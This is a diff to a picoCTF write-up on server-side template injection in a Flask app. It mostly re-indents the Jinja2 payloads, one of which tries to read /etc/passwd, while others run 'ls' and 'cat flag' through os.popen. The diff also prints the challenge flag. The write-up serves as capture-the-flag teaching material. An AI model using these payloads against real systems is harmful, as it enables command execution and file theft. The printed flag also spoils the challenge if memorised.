@@ -44,21 +44,21 @@ This confirmed the presence of SSTI.
 
     I found this payload, which tries to read the /etc/passwd file:
 
-{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
+    {{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
 
 However, this didn't work in my case, so I looked for simpler payloads.
 
 I used this payload to execute the ls command:
 
-{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
+    {{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
 
 This returned:
 
-__pycache__ app.py flag requirements.txt
+    __pycache__ app.py flag requirements.txt
 
 Then, I used the cat command to read the flag:
 
-{{config.__class__.__init__.__globals__['os'].popen('cat flag').read()}}
+    {{config.__class__.__init__.__globals__['os'].popen('cat flag').read()}}
 
 Output:
 
@@ -66,11 +66,11 @@ Output:
 
 🏁 Flag
 
-picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_ae48ad61}
+    picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_ae48ad61}
 
 Note : 
 
-Step-by-Step Breakdown
+Step-by-Step Breakdown for the payload
 1. config
 
     In Flask apps, config is often available in the template context.
